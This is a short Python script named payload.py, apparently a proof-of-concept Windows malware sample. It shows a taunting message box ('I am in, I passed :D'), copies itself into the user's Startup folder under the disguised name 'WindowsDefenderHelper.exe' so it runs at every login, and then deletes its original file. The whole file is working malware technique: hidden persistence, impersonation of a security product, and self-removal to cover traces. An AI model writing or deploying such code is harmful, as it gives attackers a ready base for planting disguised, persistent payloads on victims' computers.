# payload.py
import ctypes
import os
import sys

def show_message():
    # Display harmless message
    ctypes.windll.user32.MessageBoxW(0, "I am in, I passed :D", "System Alert", 0x40)

def add_to_startup():
    # Add to startup (persistence)
    try:
        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        os.system(f'copy "{sys.argv[0]}" "{startup_dir}\\WindowsDefenderHelper.exe"')
    except:
        pass

def self_destruct():
    # Delete the payload after execution
    try:
        os.remove(sys.argv[0])
    except:
        pass

if __name__ == "__main__":
    show_message()
    add_to_startup()
    self_destruct()